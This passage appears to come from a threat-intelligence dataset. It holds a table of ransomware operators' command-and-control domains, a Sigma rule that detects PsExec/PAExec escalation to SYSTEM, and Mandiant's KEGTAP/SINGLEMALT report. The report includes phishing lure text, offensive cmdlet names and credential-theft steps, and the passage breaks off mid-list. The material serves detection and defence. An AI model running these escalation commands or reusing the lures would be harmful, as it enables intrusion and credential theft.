VAS CO PTY LTD\n- VB CORPORATE PTY. LTD.\n- VITA-DE d.o.o.\n\n## UNC1878 Indicators\n\nA significant proportion of the post-compromise activity associated with these campaigns has involved the distribution of RYUK ransomware by a threat group tracked by Mandiant as UNC1878. As such, we are releasing indicators associated with this group.\n\n### BEACON C2s\n\n| First Seen | Domain                         |\n| ---------- | ------------------------------ |\n| 12/11/19   | updatemanagir[.]us             |\n| 12/20/19   | cmdupdatewin[.]com             |\n| 12/26/19   | scrservallinst[.]info          |\n| 1/10/20    | winsystemupdate[.]com          |\n| 1/11/20    | jomamba[.]best                 |\n| 1/13/20    | updatewinlsass[.]com           |\n| 1/16/20    | winsysteminfo[.]com            |\n| 1/20/20    | livecheckpointsrs[.]com        |\n| 1/21/20    | ciscocheckapi[.]com            |\n| 1/28/20    | timesshifts[.]com              |\n| 1/29/20    | cylenceprotect[.]com           |\n| 1/30/20    | sophosdefence[.]com            |\n| 1/30/20    | taskshedulewin[.]com           |\n| 1/30/20    | windefenceinfo[.]com           |\n| 1/30/20    | lsasswininfo[.]com             |\n| 1/30/20    | update-wind[.]com              |\n| 1/30/20    | lsassupdate[.]com              |\n| 1/30/20    | renovatesystem[.]com           |\n| 1/31/20    | updatewinsoftr[.]com           |\n| 2/2/20     | cleardefencewin[.]com          |\n| 2/2/20     | checkwinupdate[.]com           |\n| 2/2/20     | havesetup[.]net                |\n| 2/3/20     | update-wins[.]com              |\n| 2/3/20     | conhostservice[.]com           |\n| 2/4/20     | microsoftupdateswin[.]com      |\n| 2/4/20     | iexploreservice[.]com          |\n| 2/12/20    | avrenew[.]com                  |\n| 2/12/20    | target-support[.]online        |\n| 2/12/20    | web-analysis[.]live            |\n| 2/14/20    | freeallsafe[.]com              |\n| 2/17/20    | windefens[.]com                |\n| 2/17/20    | defenswin[.]com                |\n| 2/17/20    | easytus[.]com                  |\n| 2/17/20    | greattus[.]com                 |\n| 2/17/20    | livetus[.]com                  |\n| 2/17/20    | comssite[.]com                 |\n| 2/17/20    | findtus[.]com                  |\n| 2/17/20    | bigtus[.]com                   |\n| 2/17/20    | aaatus[.]com                   |\n| 2/17/20    | besttus[.]com                  |\n| 2/17/20    | firsttus[.]com                 |\n| 2/17/20    | worldtus[.]com                 |\n| 2/26/20    | freeoldsafe[.]com              |\n| 2/26/20    | serviceupdates[.]net           |\n| 2/26/20    | topserviceupdater[.]com        |\n| 2/27/20    | myserviceupdater[.]com         |\n| 2/29/20    | myservicebooster[.]net         |\n| 2/29/20    | servicesbooster[.]org          |\n| 2/29/20    | brainschampions[.]com          |\n| 2/29/20    | myservicebooster[.]com         |\n| 2/29/20    | topservicesbooster[.]com       |\n| 2/29/20    | servicesbooster[.]com          |\n| 2/29/20    | topservicesecurity[.]org       |\n| 2/29/20    | topservicesecurity[.]net       |\n| 2/29/20    | topsecurityservice[.]net       |\n| 2/29/20    | myyserviceupdater[.]com        |\n| 2/29/20    | topservicesupdate[.]com        |\n| 2/29/20    | topservicesecurity[.]com       |\n| 2/29/20    | servicesecurity[.]org          |\n| 2/29/20    | myserviceconnect[.]net         |\n| 3/2/20     | topservicesupdates[.]com       |\n| 3/2/20     | yoursuperservice[.]com         |\n| 3/2/20     | topservicehelper[.]com         |\n| 3/2/20     | serviceuphelper[.]com          |\n| 3/2/20     | serviceshelpers[.]com          |\n| 3/2/20     | boostsecuritys[.]com           |\n| 3/3/20     | hakunamatatata[.]com           |\n| 3/8/20     | service-updater[.]com          |\n| 3/9/20     | secondserviceupdater[.]com     |\n| 3/9/20     | twelvethserviceupdater[.]com   |\n| 3/9/20     | twentiethservicehelper[.]com   |\n| 3/9/20     | twelfthservicehelper[.]com     |\n| 3/9/20     | tenthservicehelper[.]com       |\n| 3/9/20     | thirdserviceupdater[.]com      |\n| 3/9/20     | thirdservicehelper[.]com       |\n| 3/9/20     | tenthserviceupdater[.]com      |\n| 3/9/20     | thirteenthservicehelper[.]com  |\n| 3/9/20     | seventeenthservicehelper[.]com |\n| 3/9/20     | sixteenthservicehelper[.]com   |\n| 3/9/20     | sixthservicehelper[.]com       |\n| 3/9/20     | seventhservicehelper[.]com     |\n| 3/9/20     | seventhserviceupdater[.]com    |\n| 3/9/20     | sixthserviceupdater[.]com      |\n| 3/9/20     | secondservicehelper[.]com      |\n| 3/9/20     | ninthservicehelper[.]com       |\n| 3/9/20     | ninethserviceupdater[.]com     |\n| 3/9/20     | fourteenthservicehelper[.]com  |\n| 3/9/20     | fourthserviceupdater[.]com     |\n| 3/9/20     | firstserviceupdater[.]com      |\n| 3/9/20     | firstservisehelper[.]com       |\n| 3/9/20     | fifthserviceupdater[.]com      |\n| 3/9/20     | eleventhserviceupdater[.]com   |\n| 3/9/20     | fifthservicehelper[.]com       |\n| 3/9/20     | fourservicehelper[.]com        |\n| 3/9/20     | eighthservicehelper[.]com      |\n| 3/9/20     | eighteenthservicehelper[.]com  |\n| 3/9/20     | eighthserviceupdater[.]com     |\n| 3/9/20     | fifteenthservicehelper[.]com   |\n| 3/9/20     | nineteenthservicehelper[.]com  |\n| 3/9/20     | eleventhservicehelper[.]com    |\n| 3/14/20    | thirdservice-developer[.]com   |\n| 3/14/20    | fifthservice-developer[.]com   |\n| 3/15/20    | firstservice-developer[.]com   |\n| 3/16/20    | fourthservice-developer[.]com  |\n| 3/16/20    | ninethservice-developer[.]com  |\n| 3/16/20    | seventhservice-developer[.]com |\n| 3/16/20    | secondservice-developer[.]com  |\n| 3/16/20    | sixthservice-developer[.]com   |\n| 3/16/20    | tenthservice-developer[.]com   |\n| 3/16/20    | eithtservice-developer[.]com   |\n| 3/17/20    | servicedupdater[.]com          |\n| 3/17/20    | service-updateer[.]com         |\n| 3/19/20    | sexyservicee[.]com             |\n| 3/19/20    | serviceboostnumberone[.]com    |\n| 3/19/20    | servicedbooster[.]com          |\n| 3/19/20    | service-hunter[.]com           |\n| 3/19/20    | servicedhunter[.]com           |\n| 3/19/20    | servicedpower[.]com            |\n| 3/19/20    | sexycservice[.]com             |\n| 3/23/20    | yourserviceupdater[.]com       |\n| 3/23/20    | top-serviceupdater[.]com       |\n| 3/23/20    | top-servicebooster[.]com       |\n| 3/23/20    | serviceshelps[.]com            |\n| 3/23/20    | servicemonsterr[.]com          |\n| 3/23/20    | servicehunterr[.]com           |\n| 3/23/20    | service-helpes[.]com           |\n| 3/23/20    | servicecheckerr[.]com          |\n| 3/23/20    | newservicehelper[.]com         |\n| 3/23/20    | huntersservice[.]com           |\n| 3/23/20    | helpforyourservice[.]com       |\n| 3/23/20    | boostyourservice[.]com         |\n| 3/26/20    | developmasters[.]com           |\n| 3/26/20    | actionshunter[.]com            |\n| 5/4/20     | info-develop[.]com             |\n| 5/4/20     | ayechecker[.]com               |\n| 5/4/20     | service-booster[.]com          |\n| 9/18/20    | zapored[.]com                  |\n| 9/22/20    | gtrsqer[.]com                  |\n| 9/22/20    | chalengges[.]com               |\n| 9/22/20    | caonimas[.]com                 |\n| 9/22/20    | hakunaman[.]com                |\n| 9/22/20    | getinformationss[.]com         |\n| 9/22/20    | nomadfunclub[.]com             |\n| 9/22/20    | harddagger[.]com               |\n| 9/22/20    | errvghu[.]com                  |\n| 9/22/20    | reginds[.]com                  |\n| 9/22/20    | gameleaderr[.]com              |\n| 9/22/20    | razorses[.]com                 |\n| 9/22/20    | vnuret[.]com                   |\n| 9/22/20    | regbed[.]com                   |\n| 9/22/20    | bouths[.]com                   |\n| 9/23/20    | ayiyas[.]com                   |\n| 9/23/20    | serviceswork[.]net             |\n| 9/23/20    | moonshardd[.]com               |\n| 9/23/20    | hurrypotter[.]com              |\n| 9/23/20    | biliyilish[.]com               |\n| 9/23/20    | blackhoall[.]com               |\n| 9/23/20    | checkhunterr[.]com             |\n| 9/23/20    | daggerclip[.]com               |\n| 9/23/20    | check4list[.]com               |\n| 9/24/20    | chainnss[.]com                 |\n| 9/29/20    | hungrrybaby[.]com              |\n| 9/30/20    | martahzz[.]com                 |\n| 10/1/20    | jonsonsbabyy[.]com             |\n| 10/1/20    | wondergodst[.]com              |\n| 10/1/20    | zetrexx[.]com                  |\n| 10/1/20    | tiancaii[.]com                 |\n| 10/1/20    | cantliee[.]com                 |\n| 10/1/20    | realgamess[.]com               |\n| 10/1/20    | maybebaybe[.]com               |\n| 10/1/20    | saynoforbubble[.]com           |\n| 10/1/20    | chekingking[.]com              |\n| 10/1/20    | rapirasa[.]com                 |\n| 10/1/20    | raidbossa[.]com                |\n| 10/1/20    | mountasd[.]com                 |\n| 10/1/20    | puckhunterrr[.]com             |\n| 10/1/20    | pudgeee[.]com                  |\n| 10/1/20    | loockfinderrs[.]com            |\n| 10/1/20    | lindasak[.]com                 |\n| 10/1/20    | bithunterr[.]com               |\n| 10/1/20    | voiddas[.]com                  |\n| 10/1/20    | sibalsakie[.]com               |\n| 10/1/20    | giveasees[.]com                |\n| 10/1/20    | shabihere[.]com                |\n| 10/1/20    | tarhungangster[.]com           |\n| 10/1/20    | imagodd[.]com                  |\n| 10/1/20    | raaidboss[.]com                |\n| 10/1/20    | sunofgodd[.]com                |\n| 10/1/20    | rulemonster[.]com              |\n| 10/1/20    | loxliver[.]com                 |\n| 10/1/20    | servicegungster[.]com          |\n| 10/1/20    | kungfupandasa[.]com            |\n| 10/2/20    | check1domains[.]com            |\n| 10/5/20    | sweetmonsterr[.]com            |\n| 10/5/20    | qascker[.]com                  |\n| 10/7/20    | remotessa[.]com                |\n| 10/7/20    | cheapshhot[.]com               |\n| 10/7/20    | havemosts[.]com                |\n| 10/7/20    | unlockwsa[.]com                |\n| 10/7/20    | sobcase[.]com                  |\n| 10/7/20    | zhameharden[.]com              |\n| 10/7/20    | mixunderax[.]com               |\n| 10/7/20    | bugsbunnyy[.]com               |\n| 10/7/20    | fastbloodhunter[.]com          |\n| 10/7/20    | serviceboosterr[.]com          |\n| 10/7/20    | servicewikii[.]com             |\n| 10/7/20    | secondlivve[.]com              |\n| 10/7/20    | quwasd[.]com                   |\n| 10/7/20    | luckyhunterrs[.]com            |\n| 10/7/20    | wodemayaa[.]com                |\n| 10/7/20    | hybriqdjs[.]com                |\n| 10/7/20    | gunsdrag[.]com                 |\n| 10/7/20    | gungameon[.]com                |\n| 10/7/20    | servicemount[.]com             |\n| 10/7/20    | servicesupdater[.]com          |\n| 10/7/20    | service-boosterr[.]com         |\n| 10/7/20    | serviceupdatter[.]com          |\n| 10/7/20    | dotmaingame[.]com              |\n| 10/12/20   | backup1service[.]com           |\n| 10/13/20   | bakcup-monster[.]com           |\n| 10/13/20   | bakcup-checker[.]com           |\n| 10/13/20   | backup-simple[.]com            |\n| 10/13/20   | backup-leader[.]com            |\n| 10/13/20   | backup-helper[.]com            |\n| 10/13/20   | service-checker[.]com          |\n| 10/13/20   | nasmastrservice[.]com          |\n| 10/14/20   | service-leader[.]com           |\n| 10/14/20   | nas-simple-helper[.]com        |\n| 10/14/20   | nas-leader[.]com               |\n| 10/14/20   | boost-servicess[.]com          |\n| 10/14/20   | elephantdrrive[.]com           |\n| 10/15/20   | service-hellper[.]com          |\n| 10/16/20   | top-backuphelper[.]com         |\n| 10/16/20   | best-nas[.]com                 |\n| 10/16/20   | top-backupservice[.]com        |\n| 10/16/20   | bestservicehelper[.]com        |\n| 10/16/20   | backupnas1[.]com               |\n| 10/16/20   | backupmastter[.]com            |\n| 10/16/20   | best-backup[.]com              |\n| 10/17/20   | viewdrivers[.]com              |\n| 10/19/20   | topservicebooster[.]com        |\n| 10/19/20   | topservice-masters[.]com       |\n| 10/19/20   | topbackupintheworld[.]com      |\n| 10/19/20   | topbackup-helper[.]com         |\n| 10/19/20   | simple-backupbooster[.]com     |\n| 10/19/20   | top3-services[.]com            |\n| 10/19/20   | backup1services[.]com          |\n| 10/21/20   | backupmaster-service[.]com     |\n| 10/21/20   | backupmasterservice[.]com      |\n| 10/21/20   | service1updater[.]com          |\n| 10/21/20   | driverdwl[.]com                |\n| 10/21/20   | backup1master[.]com            |\n| 10/21/20   | boost-yourservice[.]com        |\n| 10/21/20   | checktodrivers[.]com           |\n| 10/21/20   | backup1helper[.]com            |\n| 10/21/20   | driver1updater[.]com           |\n| 10/21/20   | driver1master[.]com            |\n| 10/23/20   | view-backup[.]com              |\n| 10/23/20   | top3servicebooster[.]com       |\n| 10/23/20   | servicereader[.]com            |\n| 10/23/20   | servicehel[.]com               |\n| 10/23/20   | driver-boosters[.]com          |\n| 10/23/20   | service1update[.]com           |\n| 10/23/20   | service-hel[.]com              |\n| 10/23/20   | driver1downloads[.]com         |\n| 10/23/20   | service1view[.]com             |\n| 10/23/20   | backups1helper[.]com           |\n| 10/25/20   | idriveview[.]com               |\n| 10/26/20   | debug-service[.]com            |\n| 10/26/20   | idrivedwn[.]com                |\n| 10/28/20   | driverjumper[.]com             |\n| 10/28/20   | service1boost[.]com            |\n| 10/28/20   | idriveupdate[.]com             |\n| 10/28/20   | idrivehepler[.]com             |\n| 10/28/20   | idrivefinder[.]com             |\n| 10/28/20   | idrivecheck[.]com              |\n| 10/28/20   | idrivedownload[.]com           |\n\n---\n\nPosted in Threat Intelligence, Security & Identity",
    "sigma_rule": {
      "title": "PsExec/PAExec Escalation to LOCAL SYSTEM",
      "id": "8834e2f7-6b4b-4f09-8906-d2276470ee23",
      "related": [
        {
          "id": "207b0396-3689-42d9-8399-4222658efc99",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious commandline flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights",
      "references": [
        "https://learn.microsoft.com/en-us/sysinternals/downloads/psexec",
        "https://www.poweradmin.com/paexec/",
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-11-23",
      "modified": "2024-03-05",
      "tags": [
        "attack.resource-development",
        "attack.t1587.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_sys": {
          "CommandLine|contains|windash": [
            " -s cmd",
            " -s -i cmd",
            " -i -s cmd",
            " -s pwsh",
            " -s -i pwsh",
            " -i -s pwsh",
            " -s powershell",
            " -s -i powershell",
            " -i -s powershell"
          ]
        },
        "selection_other": {
          "CommandLine|contains": [
            "psexec",
            "paexec",
            "accepteula"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare)",
        "Users that debug Microsoft Intune issues using the commands mentioned in the official documentation; see https://learn.microsoft.com/en-us/mem/intune/apps/intune-management-extension"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_sysinternals_psexec_paexec_escalate_system.yml",
    "id": "585"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser\n\n**October 28, 2020**\n\n---\n\nThroughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat.\n\nThe malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these malware families communicate with the same command and control infrastructure (C2) and are close to functional parity, there are minimal code overlaps across them. Other security researchers have tracked these malware families under the names BazarLoader and BazarBackdoor or Team9.\n\nThe operators conducting these campaigns have actively targeted hospitals, retirement communities, and medical centers, even in the midst of a global health crisis, demonstrating a clear disregard for human life.\n\n## Email Campaign TTPs\n\nCampaigns distributing KEGTAP, SINGLEMALT, and WINEKEY have been sent to individuals at organizations across a broad range of industries and geographies using a series of shifting delivery tactics, techniques, and procedures (TTPs). Despite the frequent changes seen across these campaigns, the following has remained consistent across recent activity:\n\n- Emails contain an in-line link to an actor-controlled Google Docs document, typically a PDF file.\n- This document contains an in-line link to a URL hosting a malware payload.\n- Emails masquerade as generic corporate communications, including follow-ups about documents and phone calls or emails crafted to appear related to complaints, terminations, bonuses, contracts, working schedules, surveys, or queries about business hours.\n- Some email communications have included the recipient’s name or employer name in the subject line and/or email body.\n\nDespite this uniformity, the associated TTPs have otherwise changed regularly—both between campaigns and across multiple spam runs seen in the same day. Notable ways that these campaigns have varied over time include:\n\n- Early campaigns were delivered via Sendgrid and included in-line links to Sendgrid URLs that would redirect users to attacker-created Google documents. In contrast, recent campaigns have been delivered via attacker-controlled or compromised email infrastructure and have commonly contained in-line links to attacker-created Google documents, although they have also used links associated with the Constant Contact service.\n- The documents loaded by these in-line links are crafted to appear somewhat relevant to the theme of the email campaign and contain additional links along with instructions directing users to click on them. When clicked, these links download malware binaries with file names masquerading as document files. Across earlier campaigns, these malware binaries were hosted on compromised infrastructure; however, the attackers have shifted to hosting their malware on legitimate web services, including Google Drive, Basecamp, Slack, Trello, Yougile, and JetBrains.\n- In recent campaigns, the malware payloads have been hosted on numerous URLs associated with one or more of these legitimate services. In cases where the payloads have been taken down, the actors have sometimes updated their Google documents to contain new, working links.\n- Some campaigns have also incorporated customization, including emails with internal references to the recipients’ organizations and organizations’ logos embedded into the Google Docs documents.\n\n```image\nAlt: Figure 1: Email containing internal references to target an organization’s name\nDescription: The image depicts a screenshot of an email titled 'Contract cancellation reminder.' The email appears to be crafted to resemble a legitimate corporate communication, with a greeting and a message informing the recipient that a contract with their company is temporarily suspended. It includes a link to a Google Docs document, which is likely intended to download malware when clicked. The email uses an official-sounding sender name, 'Bethanne Wesley,' and features a professional layout, making it seem credible to the recipient.\nTranscription: |\n  Contract cancellation reminder\n  \n  From: Bethanne Wesley <andrew.constantine@littlernews.mobi>\n  Date: Today at 11:42 AM\n  \n  Good day to you, [REDACTED]!\n  Unfortunately, we are here to tell you that our contract with [REDACTED] company is temporarily suspended because of the riots on the factory house. Payments compensation info and contract you can find here:\n  https://docs.google.com/document/d/e/2PACX-1vTX6R2anNzKGbShQGLLz_U7DvhhakDw3kOO3b6-0Gr1w6BmDwmFsXM994WAnmptW4D17wANH7l_2/pub\n  \n  We are sorry for such troubles.\n  \n  Regards,\n  Bethanne Wesley\n```\n\n```image\nAlt: Figure 2: Google Docs PDF document containing a target organization’s logo\nDescription: The image depicts a Google Drive document labeled 'Termination List.PDF' featuring a preview for a document with the title 'Termination List #49376-22/10'. A blue button labeled 'START' is prominently displayed, indicating that users can click to download the document. The message suggests that the document is ready for preview and provides instructions for downloading, emphasizing that the preview is available only on desktop computers. This layout is typical of phishing attempts, which often use such tactics to lure users into downloading malicious payloads.\nTranscription: |\n  Termination List.PDF\n  Updated automatically every 5 minutes\n  \n  Termination List #49376-22/10\n  Termination List #49376-22/10 is ready to preview. If downloading doesn't start automatically, click the buttons below.\n  \n  [START]\n  \n  Preview is available only on desktop computers.\n  \n  Published by Google Drive – Report Abuse\n```\n\nHiding the final payload behind multiple links is a simple yet effective way to bypass some email filtering technologies. Various technologies have the ability to follow links in an email to try to identify malware or malicious domains; however, the number of links followed can vary. Additionally, embedding links within a PDF document further makes automated detection and link-following difficult.\n\n## Post-Compromise TTPs\n\nGiven the possibility that accesses obtained from these campaigns may be provided to various operators to monetize, the latter-stage TTPs, including ransomware family deployed, may vary across intrusions. A notable majority of cases where Mandiant has had visibility into these post-compromise TTPs have been attributable to UNC1878, a financially motivated actor that monetizes network access via the deployment of RYUK ransomware.\n\n### Establish Foothold\n\nOnce the loader and backdoor have been executed on the initial victim host, the actors have used this initial backdoor to download POWERTRICK and/or Cobalt Strike BEACON payloads to establish a foothold. Notably, the respective loader and backdoor as well as POWERTRICK have typically been installed on a small number of hosts in observed incidents, suggesting these payloads may be reserved for establishing a foothold and performing initial network and host reconnaissance. However, BEACON is frequently found on a larger number of hosts and used throughout various stages of the attack lifecycle.\n\n### Maintain Presence\n\nBeyond the preliminary phases of each intrusion, we have seen variations in how these attackers have maintained presence after establishing an initial foothold or moving laterally within a network. In addition to the use of common post-exploitation frameworks such as Cobalt Strike, Metasploit, and EMPIRE, we have observed the use of other backdoors, including ANCHOR, that we also believe to be under control of the actors behind TrickBot.\n\n- The loaders associated with this activity can maintain persistence through reboot by using at least four different techniques, including creating a scheduled task, adding itself to the startup folder as a shortcut, creating a scheduled Microsoft BITS job using `/setnotifycmdline`, and adding itself to the Userinit value under the following registry key:\n  - `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`\n- Actors have downloaded POWERTRICK, Metasploit Meterpreter, and Cobalt Strike BEACON payloads following the initial compromise. BEACON payloads have commonly been executed after moving laterally to new hosts within the victim network. The attackers have employed Cobalt Strike payloads crafted to maintain persistence through reboot via a scheduled task on critical systems in victim environments. Notably, BEACON is the backdoor observed most frequently across these incidents.\n- We have observed actors executing encoded PowerShell commands that ultimately executed instances of the PowerShell EMPIRE backdoor.\n- The actors were observed using BEACON to execute PowerLurk's Register-MaliciousWmiEvent cmdlet to register WMI events used to kill processes related to security tools and utilities, including Task Manager, WireShark, TCPView, ProcDump, Process Explorer, Process Monitor, NetStat, PSLoggedOn, LogonSessions, Process Hacker, Autoruns, AutorunsSC, RegEdit, and RegShot.\n- In at least one case, attackers have maintained access to a victim environment using stolen credentials to access corporate VPN infrastructure configured to require only single-factor authentication.\n\n### Escalate Privileges\n\nThe most commonly observed methods for escalating privileges in these incidents have involved the use of valid credentials. The actors used a variety of techniques for accessing credentials stored in memory or on disk to access privileged accounts.\n\n- The actors used valid credentials obtained using MimiKatz variants to escalate privileges. We’ve observed Mimikatz being executed both from the file system of victim hosts and via PowerShell cmdlets executed via Cobalt Strike BEACON.\n- Actors have gained access to credentials via exported copies of the `ntds.dit` Active Directory database and SYSTEM and SECURITY registry hives from a Domain Controller.\n- In multiple instances, the actors have launched attacks against Kerberos, including the use of RUBEUS, the MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet.\n\n### Reconnaissance\n\nThe approaches taken to perform host and network reconnaissance across these incidents varied; however, a significant portion of observed reconnaissance activity has revolved around Activity Directory enumeration using publicly available utilities such as BLOODHOUND, SHARPHOUND, or ADFind, as well as the execution of PowerShell cmdlets using Cobalt Strike BEACON.\n\n- BEACON has been installed on a large number of systems across these intrusions and has been used to execute various reconnaissance commands including both built-in host commands and PowerShell cmdlets. Observed PowerShell cmdlets include:\n  - `Get-GPPPassword`\n  - `Invoke-AllChecks`\n  - `Invoke-BloodHound`\n  - `Invoke-EternalBlue`\n  - `Invoke-FileFinder`\n  - `Invoke-HostRecon`\n  - `Invoke-Inveigh`\n  - `Invoke-Kerberoast`\n  - `Invoke-LoginPrompt`\n  - `Invoke-mimikittenz`\n  - `Invoke-ShareFinder`\n  - `Invoke-UserHunter`\n- Mandiant has observed actors using POWERTRICK to execute built-in system commands on the initial victim host, including `ipconfig`, `findstr`, and `cmd.exe`.\n- The actors leveraged publicly available utilities Adfind, BLOODHOUND, SHARPHOUND, and KERBRUTE on victim networks to collect Active Directory information and credentials.\n- WMIC commands have been used to perform host reconnaissance, including listing installed software, listing running processes, and identifying operating system and system architecture.\n- The actors have used a batch script to ping all servers identified during Active Directory enumeration and output the results to `res.txt`.\n- The actors used the `Nltest` command to list domain controllers.\n\n### Lateral Movement\n\nLateral movement was most commonly accomplished using valid credentials in combination with Cobalt Strike BEACON, RDP, and SMB, or using the same backdoors used to establish a foothold in victim networks.\n\n- The actors have regularly leveraged Cobalt Strike BEACON and Metasploit Meterpreter to move laterally within victim environments.\n- The actors commonly moved laterally within victim environments using compromised accounts—both those belonging to regular users and accounts with administrative privileges. In addition to the use of common post-exploitation frameworks, lateral movement has also been achieved using WMIC commands and the Windows RDP and SMB protocols.\n- The actors used the Windows `net use` command to connect to Windows admin shares to move laterally.\n\n### Complete Mission\n\nMandiant is directly aware of incidents involving KEGTAP that included the post-compromise deployment of RYUK ransomware. We have also observed instances where ANCHOR infections, another backdoor associated with the same actors, preceded CONTI or MAZE deployment.\n\n- In at least one case, an executable was observed that was designed to exfiltrate files via SFTP to an attacker-controlled server.\n- The actors have used Cobalt Strike BEACON to exfiltrate data created through network reconnaissance activities as well as user files.\n- The actors were observed deleting their tools from victim hosts in an attempt to remove indicators of compromise.\n- The actors have used their access to the victim network to deploy ransomware payloads. There is evidence to suggest that RYUK ransomware was likely deployed via PsExec, but other scripts or artifacts related to the distribution process were not available for forensic analysis.\n\n## Hunting Strategies\n\nIf an organization identifies a host with an active infection believed to be an instance of KEGTAP or a parallel malware family, the following containment actions are recommended. Note that due to the velocity of this intrusion activity, these actions should be taken in parallel.\n\n- Isolate and perform a forensic review of any impacted systems.\n- Review incoming emails to the user that owns the impacted device for emails matching the distribution campaigns, and take action to remove the messages from all mailboxes.\n- Identify the URLs used by the phishing campaign and block them using proxy or network security devices.\n- Reset credentials for any user accounts associated with execution of the malware.\n- Perform an enterprise-wide review for lateral movement authentication from the impacted systems.\n- Check authentication logs from any single-factor remote access solutions that may exist (VPN, VDI, etc.) and move towards multi-factor authentication (MFA) as soon as possible.\n\nAn enterprise-wide effort should be made to identify host-based artifacts related to the execution of first-stage malware and all post-intrusion activity associated with this activity. Some baseline approaches to this have been captured as follows.\n\nActivity associated with the KEGTAP loader can often be identified via a review of system startup folders and Userinit values under the `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` registry key.\n\n```\n%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\adobe.lnk\n```\n\n*Figure 3: Example LNK file associated with KEGTAP persistence within a system’s startup folders*\n\nSINGLEMALT employs BITS to maintain persistence through reboot and can often be identified via a review of anomalous BITS jobs. SINGLEMALT uses a well-documented BITS persistence mechanism that intentionally creates a job to download a non-existent URL, which will trigger a failure event. The job is set to retry on a regular interval, thus ensuring the malware continues to run. To review the BITS job on a host, run the command `bitsadmin /list`.\n\n- Display name may be “Adobe Update”, “System autoupdate” or another generic value.\n- Notify state may be set to Fail (Status 2).\n- FileList URL value may be set to the local host or a URL that does not exist.\n- The Notification Command Line value may contain the path to the SINGLEMALT sample and/or a command to move it to a new location then start it.\n- The Retry Delay value will be set.\n\nWINEKEY maintains persistence through reboot via the use of registry RUN keys. Searching for anomalous RUN keys enterprise-wide can help to identify systems impacted by this malware.\n\n```\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backup Mgr\n\nValue: Path to the backdoor\n```\n\n*Figure 4: Example registry RUN key used by WINEKEY to maintain persistence*\n\nThe ANCHOR backdoor has been seen across a subset of intrusions associated with this activity and can often be identified via the scheduled tasks it uses to maintain persistence through reboot. The scheduled tasks created by ANCHOR are often unnamed, although that is not always the case.\n\n- The identification of named scheduled tasks associated with ANCHOR persistence may be constructed according to the following pattern: `<Random directory within %APPDATA%> autoupdate#<random number>`.\n- All unnamed scheduled tasks should be reviewed, particularly those with a creation date consistent with the time of the suspected compromise.\n\nAlthough it is a low fidelity indicator, ANCHOR activity may also sometimes be identified by searching for binaries within the `C:\\Windows\\SysWOW64` directory that have a file name matching the following pattern: `<8 random lowercase chars>.exe`. Stacking or sorting on file creation timestamps in the `C:\\Windows\\SysWOW64` directory may also help identify malicious files, as the directory should be mostly static.\n\nPost-exploitation activity associated with the deployment of ransomware following these campaigns is typically conducted using the Cobalt Strike attack framework. The BEACON payload associated with Cobalt Strike can often be identified via a review of existing registered services and service creation events (Event ID 7045), both markers of the mechanism it most commonly employs to maintain persistence.\n\nThe following are additional strategies that may aid in identifying associated activity:\n\n- Organizations can review web proxy logs in order to identify HXXP requests for file storage, project management, collaboration, or communication services with a referrer from a Google Docs document.\n- During the associated post-compromise activity, attackers have commonly staged their tools and data in the PerfLogs directory and C$ share.\n- While collecting data used to enable later-stage operations, the attackers commonly leave instances of `ntds.dit` and exports of the SYSTEM and SECURITY registry hives on impacted systems.\n\n## Hardening Strategies\n\nThe actions taken by the actors to escalate privileges and move laterally in an environment use well-documented techniques that search the network and Active Directory for common misconfigurations that expose credentials and systems for abuse. Organizations can take steps to limit the impact and effectiveness of these techniques. For more in-depth recommendations see our ransomware protection white paper.\n\n- Harden service accounts against brute force and password guessing attacks. Most organizations have at least a few service accounts with passwords set to never expire. These passwords are likely old and insecure. Make a best effort to reset as many of these accounts as possible to long and complex passwords. In cases where it is possible, migrate to MSAs and gMSAS for automated rotation.\n- Prevent the usage of privileged accounts for lateral movement. Use GPOs to restrict the ability for privileged accounts such as Domain Administrators and privileged service accounts from initiating RDP connections and network logins. Actors often pick just a few accounts to use for RDP; by limiting the number of potential accounts, you provide detection opportunities and opportunities to slow the actor.\n- Block internet access for servers where possible. Often times there is no business need for servers, especially AD infrastructure systems, to access the Internet. The actors often choose high-uptime servers for the deployment of post-exploitation tools such as BEACON.\n- Block uncategorized and newly registered domains using web proxies or DNS filters. Often the final payload delivered via phishing is hosted on a compromised third-party website that does not have a business categorization.\n- Ensure that critical patches are installed on Windows systems as well as network infrastructure. We have observed attackers exploiting well-known vulnerabilities such as Zerologon (CVE-2020-1472) to escalate privileges in an environment prior to deploying ransomware. In other cases, possibly unrelated to UNC1878, we have observed threat actors gain access to an environment through vulnerable VPN infrastructure before deploying ransomware.\n\nFor more intelligence on ransomware and other threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform. Check out this episode of *State of the Hack* for additional information on this threat.\n\n## Campaign Indicators\n\n### Sample Email Subjects / Patterns\n\n- `<(first|last)-name>: Important Information`\n- `<Company Name>`\n- `<Company Name> complaint`\n- `<(first|last)-name>`\n- Agreement cancellation message\n- Agreement 